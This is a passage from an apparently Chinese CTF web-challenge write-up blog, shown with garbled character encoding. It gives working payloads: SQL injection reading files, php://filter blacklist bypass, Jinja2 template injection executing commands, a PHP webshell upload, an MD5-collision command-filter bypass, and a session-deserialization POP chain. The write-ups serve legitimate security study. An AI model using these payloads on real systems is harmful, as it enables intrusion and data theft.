æ­¤åˆ†ä¸¤æ¬¡è¾“å‡ºï¼Œpayload: 1231&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)#1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),20,50)),0x7e),1)# [HarekazeCTF2019]encode_and_encodeè¿›å…¥ç½‘é¡µï¼Œéšä¾¿ç‚¹ç‚¹å‘ç°æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940 &lt;?phperror_reporting(0);if (isset($_GET[&#x27;source&#x27;])) &#123; show_source(__FILE__); exit();&#125;function is_valid($str) &#123; $banword = [ // no path traversal &#x27;\\.\\.&#x27;, // no stream wrapper &#x27;(php|file|glob|data|tp|zip|zlib|phar):&#x27;, // no data exfiltration &#x27;flag&#x27; ]; $regexp = &#x27;/&#x27; . implode(&#x27;|&#x27;, $banword) . &#x27;/i&#x27;; if (preg_match($regexp, $str)) &#123; return false; &#125; return true;&#125;$body = file_get_contents(&#x27;php://input&#x27;);$json = json_decode($body, true);if (is_valid($body) &amp;&amp; isset($json) &amp;&amp; isset($json[&#x27;page&#x27;])) &#123; $page = $json[&#x27;page&#x27;]; $content = file_get_contents($page); if (!$content || !is_valid($content)) &#123; $content = &quot;&lt;p&gt;not found&lt;/p&gt;\\n&quot;; &#125;&#125; else &#123; $content = &#x27;&lt;p&gt;invalid request&lt;/p&gt;&#x27;;&#125;// no data exfiltration!!!$content = preg_replace(&#x27;/HarekazeCTF\\&#123;.+\\&#125;/i&#x27;, &#x27;HarekazeCTF&#123;&amp;lt;censored&amp;gt;&#125;&#x27;, $content);echo json_encode([&#x27;content&#x27; =&gt; $content]); é¦–å…ˆå¯¹$bodyè¿›è¡Œjsonè§£ç ï¼Œæ¥ç€å‘ç°$jsonä¸­éœ€è¦å«æœ‰$pageï¼Œ$contentä¼šå»è¯»å–$pageæ–‡ä»¶ï¼Œä½†æ˜¯ä¸èƒ½æœ‰é»‘åå•ä¸­çš„å­—ç¬¦ã€‚æœ€ååˆ¤æ–­å¦‚æœè¾“å‡ºä¸­æœ‰flagå¤´æ–‡ä»¶ï¼Œåˆ™æ›¿æ¢ä¸ºç©ºã€‚ é‚£ä¹ˆæˆ‘ä»¬éœ€è¦ç»•è¿‡çš„å°±æ˜¯å…³äºä¼ å…¥çš„å­—ç¬¦ä»¥åŠè¾“å‡ºçš„å†…å®¹çš„æ­£åˆ™åŒ¹é…äº†ï¼Œè¾“å…¥ç”¨jsonå­—ç¬¦ç¼–ç ç»•è¿‡ï¼Œè¾“å‡ºç”¨phpä¼ªåè®®ç»•è¿‡ï¼Œè®°å¾—ä¸Šä¼ æ—¶æ˜¯jsonæ ¼å¼ï¼Œpayloadï¼š 1&#123;&quot;page&quot;:&quot;\\u0070\\u0068\\u0070://filter/convert.base64-encode/resource=/\\u0066\\u006c\\u0061\\u0067&quot;&#125; base64è§£ç è¯»å–flagã€‚ [RootersCTF2019]I_&lt;3_Flaské¢˜ç›®éƒ½å‘Šè¯‰æ˜¯æ¨¡æ¿æ³¨å…¥äº†ï¼Œä½†æ˜¯æ‰¾äº†åŠå¤©å•¥éƒ½æ²¡æ‰¾åˆ°ï¼Œæœ€é‡è¦çš„æ˜¯å‚æ•°æ²¡æ‰¾åˆ°ï¼Œå› æ­¤è¿™é‡Œè¦ç”¨åˆ°arjunè¿™ä¸ªå·¥å…·äº†ï¼š 12345arjun -u http://861ba40a-963d-4243-b551-f583f8a49a21.node4.buuoj.cn:81/ -m GET -c 200 -d 5ç”±äºbuuçš„è®¾ç½®ï¼Œæˆ‘ä»¬éœ€è¦è®¾ç½®æ—¶é—´é—´éš”ï¼Œå¦åˆ™ä¼šå¯¼è‡´çˆ†ç ´å¤±è´¥ç»“æœï¼šname: name, factor: body length è¯»å–åˆ°å‚æ•°åä¸ºnameï¼Œæ¥ç€ç›´æ¥æ„å»ºpayloadå³å¯ï¼š 123456?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()&#125;&#125;//æ‰¾å­ç±»ï¼Œå‘ç°warnings.catch_warningsï¼ŒæŸ¥è¯¢ä½ç½®ä¸º182ä½?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[182].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;?name=&#123;&#123;().__class__.__bases__[0].__subclasses__()[182].__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;)&#125;&#125; çœ‹äº†åˆ«äººçš„wpï¼Œå‘ç°å¯ä»¥ä½¿ç”¨tplmapè¿™ä¸ªå·¥å…·ï¼Œæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼š 12345python2 tplmap.py -u http://861ba40a-963d-4243-b551-f583f8a49a21.node4.buuoj.cn:81/?name=1//å‘ç°Jinja2æ¨¡æ¿python2 tplmap.py -u http://861ba40a-963d-4243-b551-f583f8a49a21.node4.buuoj.cn:81/?name=1 --os-shell//è·å–shell æœ€åå¾—åˆ°flagã€‚ [WUSTCTF2020]CV Makerè¿›ç½‘é¡µæ˜¯ä¸ªç™»å½•æ¡†ï¼Œæµ‹è¯•æ²¡å‘ç°sqlï¼Œé‚£å…ˆæ³¨å†Œç™»å½•çœ‹çœ‹ã€‚ç™»é™†åå‘ç°æ˜¯ä¸ªä¸ªäººé¡µé¢ï¼Œå¯ä»¥ä¸Šä¼ å¤´åƒï¼Œé‚£åŸºæœ¬æ˜¯æ–‡ä»¶ä¸Šä¼ æ²¡è·‘äº†ã€‚ ç›´æ¥ä¼ å›¾ç‰‡ç ï¼Œç»è¿‡æµ‹è¯•å‘ç°ç»•è¿‡æ£€æµ‹æ–¹æ³•æ˜¯å°†æ–‡ä»¶åæ”¹ä¸ºshell.jpg.phpï¼Œåœ¨å®¡æŸ¥å…ƒç´ ä¸­æ‰¾åˆ°è·¯å¾„ï¼Œèšå‰‘è¿æ¥ï¼Œè¿æ¥åå‘ç°æ ¹ç›®å½•ä¸‹å­˜åœ¨flagï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥è¯»å–ï¼Œå› æ­¤æ‰“å¼€ç»ˆç«¯ä½¿ç”¨å‘½ä»¤æ‰§è¡Œï¼š 12345lsFlag_aqi2282u922oijicat Flag_aqi2282u922oijiflag&#123;b46e346f-a5e6-47ba-8e29-5196988ea1d2&#125; [HCTF 2018]adminå…ˆæ¥ä¸ªç¦»è°±çš„ï¼Œç›´æ¥è´¦å·adminå¯†ç 123ç™»å½•å°±èƒ½æ‹¿åˆ°flagäº†ã€‚ è¿™é‡Œæˆ‘çœ‹äº†åˆ«äººçš„wpæœ‰ä¸‰ç§è§£æ³•ï¼Œä½†æ˜¯ç”±äºbuué™åˆ¶å‘åŒ…é‡ï¼Œç„¶åflaské‚£ä¸ªæ–¹æ³•æˆ‘è¿˜ä¸æ˜¯å¾ˆç†è§£ï¼Œè¿™é‡Œå°±ç”¨unicodeæ¬ºéª—é‚£ä¸ªæ–¹æ³•æ¥è§£ã€‚ é¦–å…ˆéšä¾¿æ³¨å†Œç™»å½•ï¼Œåœ¨change passwrodéƒ¨åˆ†æ‰¾åˆ°hintï¼š 1https://github.com/woadsl1234/hctf_flask/ å®¡è®¡æ³¨å†Œã€ç™»å½•ä¸æ”¹å¯†çš„è·¯ç”±ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152ef register(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = RegisterForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower(): flash(&#x27;Wrong verify code.&#x27;) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form) if User.query.filter_by(username = name).first(): flash(&#x27;The username has been registered&#x27;) return redirect(url_for(&#x27;register&#x27;)) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash(&#x27;register successful&#x27;) return redirect(url_for(&#x27;login&#x27;)) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form) @app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def login(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = LoginForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash(&#x27;Invalid username or password&#x27;) return redirect(url_for(&#x27;login&#x27;)) login_user(user, remember=form.remember_me.data) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#x27;change successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form) å‘ç°è¿™ä¸‰ä¸ªè·¯ç”±éƒ½åœ¨ç”¨æˆ·åä¸Šä½¿ç”¨äº†strlower()æ—¶ç”¨æˆ·åå˜ä¸ºå°å†™ã€‚è¿™æ—¶ï¼Œæœ‰ä¸€ç§ç¥å¥‡çš„å­—ç¬¦ï¼š 1á´¬á´°á´¹á´µá´º è¿™ä¸ªå­—ç¬¦ç¬¬ä¸€æ¬¡ç»è¿‡strlower()æ—¶ä¼šè¢«è½¬æ¢æˆADMINï¼Œè€Œç»“åˆè·¯ç”±ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨è¿™ä¸ªç”¨æˆ·åæ³¨å†Œï¼Œé‚£ä¹ˆåœ¨æ³¨å†Œæ—¶é¦–å…ˆä¼šè¢«è½¬å˜æˆADMINï¼Œä¹‹åæ”¹å¯†ç ADMINå†æ¬¡ç»è¿‡strlower()å˜æˆadminï¼Œæˆ‘ä»¬å°±å¯ä»¥ç™»å½•adminè·å–flagäº†ã€‚ è¿™ä¸ªæ–¹æ³•æ˜¯çœŸçš„ç¦»è°±ï¼Œå­¦ä¹ äº†ã€‚ [ASIS 2019]Unicorn shopè¿›å…¥ç½‘é¡µï¼Œå‘ç°æœ‰å››ä¸ªä¸œè¥¿èƒ½è®©æˆ‘ä»¬ä¹°ï¼Œä½†æ˜¯æµ‹è¯•äº†ä¸‹å‘ç°æˆ‘ä»¬åªèƒ½ä¹°æœ€è´µçš„é‚£ä¸ªï¼Œä½†å°è¯•è¾“å…¥ä»·æ ¼æ—¶å‘ç°åªèƒ½è¾“å…¥ä¸€ä¸ªå­—ç¬¦ï¼Œä½†æ˜¯æˆ‘ä»¬è¦è¾“å…¥ä¸€ä¸ªå¤§äº1337çš„å€¼ã€‚ è¿™é‡Œçš„çŸ¥è¯†ç‚¹æ˜¯unicodeç¼–ç å®‰å…¨é—®é¢˜ï¼Œå³å¯ä»¥ç”¨åˆ«çš„è¯­è¨€æ¥ä»£è¡¨æ•°å­—ï¼Œæˆ‘ä»¬é€šè¿‡ä¸‹é¢è¿™ä¸ªç½‘å€æ¥æŸ¥æ‰¾unicodeå­—ç¬¦ï¼šUnicodeå­—ç¬¦æŸ¥æ‰¾ æˆ‘ä»¬é€‰æ‹©â†‚å­—ç¬¦ï¼Œè¿™ä¸ªå­—ç¬¦ä»£è¡¨çš„å€¼æ˜¯10000ï¼Œå¤åˆ¶å®ƒçš„utf-8ç¼–ç ï¼ˆæºç ä¸­å®šä¹‰äº†ç¼–ç æ ¼å¼å¹¶ä¸”æ˜ç¡®å‘Šè¯‰æˆ‘ä»¬è¿™ä¸ªå¾ˆé‡è¦ï¼‰ï¼Œç„¶åå°†0xæ”¹ä¸º%ï¼Œpayloadï¼š 1id=4&amp;price=%E2%86%82 [å®‰æ´µæ¯ 2019]easy_webå‰ç«¯å¼€å¹•é›·å‡»ï¼Œç›´æ¥è´¨é—®æˆ‘webç‹—æ€ä¹ˆæ´»ï¼Œç­”æ¡ˆæ˜¯æ´»ä¸äº†ï¼Œæˆ‘ç›´æ¥æ³ªç›®äº†ã€‚ å¥½äº†æˆ‘è£…çš„ï¼Œçœ‹é¢˜ç›®ï¼Œå‘ç°urlä¸å¯¹ç»ï¼š 181a58bcb-8a03-4fac-9b39-a3d4f40421b6.node4.buuoj.cn:81/index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd= imgçš„å†…å®¹ç–‘ä¼¼base64ï¼Œè§£ç è¯•è¯•ï¼Œä¸¤å±‚è§£å¯†å‘ç°ä¸€ä¸²åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå†æ¬¡è§£ç ï¼Œå¾—åˆ°çš„å†…å®¹æ˜¯555.pngã€‚é‚£ä¹ˆæˆ‘ä»¬è¯•è¯•å°†index.phpç”¨åŒæ ·æ–¹æ³•æ“ä½œä¸‹å¸¦å…¥ä¼šå‘ç”Ÿä»€ä¹ˆï¼š 1TmprMlpUWTBOalUzT0RKbE56QTJPRGN3 å‘ç°å›¾ç‰‡çš„base64å˜äº†ï¼Œè§£ç è·å–æºç ï¼š 12345678910111213141516171819202122232425262728293031&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#x27;content-type:text/html;charset=utf-8&#x27;);$cmd = $_GET[&#x27;cmd&#x27;];if (!isset($_GET[&#x27;img&#x27;]) || !isset($_GET[&#x27;cmd&#x27;])) header(&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;);$file = hex2bin(base64_decode(base64_decode($_GET[&#x27;img&#x27;])));$file = preg_replace(&quot;/[^a-zA-Z0-9.]+/&quot;, &quot;&quot;, $file);if (preg_match(&quot;/flag/i&quot;, $file)) &#123; echo &#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;; die(&quot;xixiï½ no flag&quot;);&#125; else &#123; $txt = base64_encode(file_get_contents($file)); echo &quot;&lt;img src=&#x27;data:image/gif;base64,&quot; . $txt . &quot;&#x27;&gt;&lt;/img&gt;&quot;; echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\&#x27;|\\&quot;|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\&#123;|\\&#125;|\\(|\\)|\\&amp;[^\\d]|@|\\||\\\\$|\\[|\\]|&#123;|&#125;|\\(|\\)|-|&lt;|&gt;/i&quot;, $cmd)) &#123; echo(&quot;forbid ~&quot;); echo &quot;&lt;br&gt;&quot;;&#125; else &#123; if ((string)$_POST[&#x27;a&#x27;] !== (string)$_POST[&#x27;b&#x27;] &amp;&amp; md5($_POST[&#x27;a&#x27;]) === md5($_POST[&#x27;b&#x27;])) &#123; echo `$cmd`; &#125; else &#123; echo (&quot;md5 is funny ~&quot;); &#125;&#125;?&gt; å‘ç°md5å¼ºç±»å‹æ¯”è¾ƒï¼Œè¿™ä¸ªä¹‹å‰æ²¡æœ‰ç¢°åˆ°ï¼Œæ‰¾äº†ä¸‹å‘ç°å¯ä»¥ç”¨ä¸‹é¢è¿™ä¸ªpayloadç»•è¿‡ï¼š 1a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2 æ¥ç€å‘ç°ä¸€ä¼—å‘½ä»¤è¢«è¿‡æ»¤ï¼ŒåŒ…æ‹¬lsï¼Œå› æ­¤è¿™é‡Œç”¨diréå†ç›®å½•ï¼Œç©ºæ ¼è¢«è¿‡æ»¤ä½¿ç”¨%20ä»£æ›¿ï¼Œå‘ç°flagæ–‡ä»¶åœ¨æ ¹ç›®å½•ï¼Œç”¨äºcatè¢«è¿‡æ»¤ï¼Œå› æ­¤ä½¿ç”¨åæ–œæ ç»•è¿‡ï¼Œpayloadï¼š 1?img=1&amp;cmd=ca\\t%20/flag å½“ç„¶æˆ‘å»æ‰¾äº†ä¸‹ï¼Œå‘ç°è¿˜å¯ä»¥ç”¨sortè¯»å–æ–‡ä»¶ï¼Œpayloadï¼š 1?img=1&amp;cmd=sort%20/flag","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web -write up -ctf","slug":"web-write-up-ctf","permalink":"http://example.com/tags/web-write-up-ctf/"}]},{"title":"Sessionååºåˆ—åŒ–ä¸å­—ç¬¦ä¸²é€ƒé€¸","slug":"Sessionååºåˆ—åŒ–ä¸å­—ç¬¦ä¸²é€ƒé€¸","date":"2022-03-01T06:58:38.000Z","updated":"2022-03-02T12:25:13.571Z","comments":true,"path":"2022/03/01/Sessionååºåˆ—åŒ–ä¸å­—ç¬¦ä¸²é€ƒé€¸/","link":"","permalink":"http://example.com/2022/03/01/Session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8/","excerpt":"å‰è¨€ å‘ç°è‡ªå·±çš„ååºåˆ—åŒ–ç‰¹åˆ«æ˜¯popé“¾æ˜¯çœŸçš„ä¸è¡Œï¼Œå› æ­¤æ¥ä¸‹æ¥è¦æ¶è¡¥ä¸‹è¿™ä¸€å—ï¼Œè¿™æ¬¡ä¹Ÿæ˜¯å› ä¸ºåšé¢˜ç¢°åˆ°äº†sessionååºåˆ—åŒ–æ‰€ä»¥æ¥å­¦ä¹ ä¸€æ³¢ã€‚","text":"å‰è¨€ å‘ç°è‡ªå·±çš„ååºåˆ—åŒ–ç‰¹åˆ«æ˜¯popé“¾æ˜¯çœŸçš„ä¸è¡Œï¼Œå› æ­¤æ¥ä¸‹æ¥è¦æ¶è¡¥ä¸‹è¿™ä¸€å—ï¼Œè¿™æ¬¡ä¹Ÿæ˜¯å› ä¸ºåšé¢˜ç¢°åˆ°äº†sessionååºåˆ—åŒ–æ‰€ä»¥æ¥å­¦ä¹ ä¸€æ³¢ã€‚ Sessionååºåˆ—åŒ–äº†è§£php.iniä¸­çš„Sessionè®¾ç½® session.save_path=â€â€ â€“è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„ session.save_handler=â€â€â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰å­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼) session.auto_start boolenâ€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯é»˜è®¤ä¸º0ä¸å¯åŠ¨ session.serialize_handler stringâ€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ï¼Œé»˜è®¤ä½¿ç”¨php Sessionååºåˆ—åŒ–æ¼æ´çš„å‡ºç°ç”±äºå¤„ç†å™¨å¯¹ååºåˆ—åŒ–çš„å¤„ç†æ–¹å¼ä¸åŒï¼Œå¯¼è‡´äº†åºåˆ—åŒ–çš„å‚¨å­˜æ ¼å¼çš„ä¸åŒï¼š 12345678php:é”®å|ç»è¿‡serialize()åºåˆ—åŒ–çš„å€¼ä¾‹å¦‚ï¼šmrl64|s:6:&quot;hacker&quot;;php_binary:é”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ä¾‹å¦‚ï¼šmrl64s:6:&quot;hacker&quot;;php_serialize:ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ä¾‹å¦‚ï¼ša:1:&#123;s:5:&quot;mrl64&quot;;s:6:&quot;hacker&quot;;&#125; è€Œå¦‚æœç¨‹åºä½¿ç”¨ä¸¤ä¸ªå¼•æ“æ¥åˆ†æ‰¹å¤„ç†sessionæ•°åˆ—åŒ–ç»“æ„çš„è¯ï¼Œå°±ä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ååºåˆ—åŒ–ï¼Œå¯¼è‡´å¯ä»¥æ„é€ payloadç»•è¿‡ä¸€äº›éªŒè¯ã€‚ æ¯”å¦‚æˆ‘ä»¬å…ˆå­˜å…¥sessionå˜é‡ï¼š 1234&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);session_start();$_SESSION[&#x27;mrl64&#x27;] = &#x27;|O:6:&quot;hacker&quot;:1:&#123;s:4:&quot;hack&quot;;s:3:&quot;lol&quot;;&#125;&#x27;; åœ¨Sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼š 1a:1:&#123;s:5:&quot;mrl64&quot;;s:39:&quot;|O:6:&quot;hacker&quot;:1:&#123;s:4:&quot;hack&quot;;s:3:&quot;lol&quot;;&#125; è¿™æ—¶å€™æˆ‘ä»¬æ¨¡æ‹Ÿè¯»å–ï¼Œä½†æ˜¯ç”¨ä¸åŒçš„å¤„ç†å™¨è¿›è¡Œå¤„ç†ï¼š 123456789&lt;?phpini_set(&#x27;session.serialize_handler&#x27;, &#x27;php&#x27;);session_start();class hacker&#123; var $hack; function __wakeup() &#123; echo $this-&gt;hack; &#125;&#125; è¿™æ—¶å€™æˆ‘ä»¬å‘ç°ä¼šæ˜¾çš„æ˜¯lolï¼Œè¯´æ˜__wakeup()é­”æœ¯æ–¹æ³•è¢«è§¦å‘äº†ï¼Œè¿™æ˜¯ç”±äºphpå¤„ç†å™¨ä¼šå°†|å‰çš„å†…å®¹ä½œä¸ºé”®åã€‚ ã€GCTF2017ã€‘PHPåºåˆ—åŒ–å®¡è®¡index.php: 1234567891011121314151617181920212223242526&lt;?php//error_reporting(E_ERROR &amp; ~E_NOTICE);ini_set(&#x27;session.serialize_handler&#x27;, &#x27;php_serialize&#x27;);header(&quot;content-type;text/html;charset=utf-8&quot;);session_start();if(isset($_GET[&#x27;src&#x27;]))&#123; $_SESSION[&#x27;src&#x27;] = $_GET[&#x27;src&#x27;]; highlight_file(__FILE__); print_r($_SESSION[&#x27;src&#x27;]);&#125;?&gt;&lt;!DOCTYPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;ä»£ç å®¡è®¡2&lt;/title&gt; &lt;/head&gt; &lt;body&gt; åœ¨phpä¸­ï¼Œç»å¸¸ä¼šä½¿ç”¨åºåˆ—åŒ–æ“ä½œæ¥å­˜å–æ•°æ®ï¼Œä½†æ˜¯åœ¨åºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­å¦‚æœå¤„ç†ä¸å½“ä¼šå¸¦æ¥ä¸€äº›å®‰å…¨éšæ‚£ã€‚&lt;form action=&quot;./query.php&quot; method=&quot;POST&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;ticket&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;a href=&quot;./?src=1&quot;&gt;æŸ¥çœ‹æºç &lt;/a&gt;&lt;/body&gt;&lt;/html&gt; æ¥ç€æ ¹æ®æç¤ºè®¿é—®query.php~è¯»å–æºç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041session_start();header(&#x27;Look me: edit by vim ~0~&#x27;)//......class TOPA&#123; public $token; public $ticket; public $username; public $password; function login()&#123; //if($this-&gt;username == $USERNAME &amp;&amp; $this-&gt;password == $PASSWORD)&#123; //æŠ±æ­‰ $this-&gt;username ==&#x27;aaaaaaaaaaaaaaaaa&#x27; &amp;&amp; $this-&gt;password == &#x27;bbbbbbbbbbbbbbbbbb&#x27;)&#123; return &#x27;key is:&#123;&#x27;.$this-&gt;token.&#x27;&#125;&#x27;; &#125; &#125;&#125;class TOPB&#123; public $obj; public $attr; function __construct()&#123; $this-&gt;attr = null; $this-&gt;obj = null; &#125; function __toString()&#123; $this-&gt;obj = unserialize($this-&gt;attr); $this-&gt;obj-&gt;token = $FLAG; if($this-&gt;obj-&gt;token === $this-&gt;obj-&gt;ticket)&#123; return (string)$this-&gt;obj; &#125; &#125;&#125;class TOPC&#123; public $obj; public $attr; function __wakeup()&#123; $this-&gt;attr = null; $this-&gt;obj = null; &#125; function __destruct()&#123; echo $this-&gt;attr; &#125;&#125; æˆ‘ä»¬å‘ç°åœ¨index.phpä¸­è¿›è¡Œäº†ini_set()ï¼Œè€Œquery.phpå´æ²¡æœ‰ï¼Œå› æ­¤æ˜¯é»˜è®¤phpå¤„ç†å™¨ï¼Œç¬¦åˆsessionååºåˆ—åŒ–çš„å‰ç½®ã€‚ æ¥ç€è§‚å¯Ÿæºç ï¼Œå‘ç°åªæœ‰TOPCä¸­å­˜åœ¨echoï¼Œè€Œè¦è®©attrèƒ½å¤Ÿè¾“å‡ºå†…å®¹éœ€è¦ç»•è¿‡TOPCä¸­çš„__wakeup()é­”æœ¯æ–¹æ³•ã€‚æ¥ç€å‘ç°TOPBçš„__toString()é­”æœ¯æ–¹æ³•ä¸­å­˜åœ¨&amp;FLAGçš„èµ‹å€¼ä»¥åŠååºåˆ—åŒ–å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬è¦å°†attrèµ‹å€¼ä¸ºTOPBå¯¹è±¡ä»è€Œè§¦å‘è¿™ä¸ªé­”æœ¯æ–¹æ³•ã€‚è€Œifçš„åˆ¤æ–­è¯­å¥ä¸­éœ€è¦$this-&gt;obj-&gt;token === $this-&gt;obj-&gt;ticketï¼Œè¿™é‡Œè¦å»ºç«‹å¼•ç”¨å…³ç³»$a-&gt;ticket = &amp;$a-&gt;token;æ¥ç»•è¿‡åˆ¤æ–­ã€‚è€Œè¦ç”¨åˆ°ticketä¸tokenåˆ™å¿…é¡»è°ƒç”¨TOPAç±»ï¼Œè€Œè¦è°ƒç”¨TOPAç±»å°±å¿…é¡»ç»•è¿‡ifåˆ¤æ–­ï¼Œä½†æ˜¯ç”±äºè¿™é‡Œæ˜¯ä¸ªå¼±æ¯”è¾ƒï¼Œå› æ­¤æˆ‘ä»¬è®©username=password=0å°±å¯ä»¥äº†ï¼Œ0è‹¥ç­‰äºå­—ç¬¦ä¸²ã€‚ é€»è¾‘ç†å®Œï¼Œæ„å»ºexpï¼š 1234567891011$A = new TOPA();$B = new TOPB();$C = new TOPC();$A -&gt; username = 0$A -&gt; password = 0$A -&gt; ticket = &amp;$A-&gt;token;$s = serialize($A);$C -&gt; attr = $B;$B -&gt; attr = $s;$flag = serialize($C);echo $flag; æœ€åè®°å¾—è¦ç»•è¿‡wakeupï¼Œå¹¶ä¸”åŠ ä¸Š|ï¼Œpayload: 1|O:4:&quot;TOPC&quot;:3:&#123;s:3:&quot;obj&quot;;N;s:4:&quot;attr&quot;;O:4:&quot;TOPB&quot;:2:&#123;s:3:&quot;obj&quot;;N;s:4:&quot;attr&quot;;s:84:&quot;O:4:&quot;TOPA&quot;:4:&#123;s:5:&quot;token&quot;;N;s:6:&quot;ticket&quot;;R:2;s:8:&quot;username&quot;;i:0;s:8:&quot;password&quot;;i:0;&#125;&quot;;&#125;&#125; æ— $_SESSIONå˜é‡çš„èµ‹å€¼ä¸Šé¢çš„é¢˜ç›®ä¸­æ˜¯å­˜åœ¨$_SESSION[&#39;src&#39;]è¿›è¡Œèµ‹å€¼çš„ï¼Œä½†æ˜¯åœ¨æœ‰äº›é¢˜ç›®ä¸­æ˜¯æ²¡æœ‰çš„ï¼Œè¿™æ—¶å€™å°±è¦è¿ç”¨åˆ°phpåˆ©ç”¨sessionä¸Šä¼ è¿›åº¦äº†ã€‚ è¯¦ç»†å¯ä»¥å‚è€ƒphpæ‰‹å†Œï¼šSessionä¸Šä¼ è¿›åº¦ å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯session.upload_progress.prefixä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚é€šå¸¸è¿™äº›é”®å€¼å¯ä»¥é€šè¿‡è¯»å–INIè®¾ç½®æ¥è·å¾— 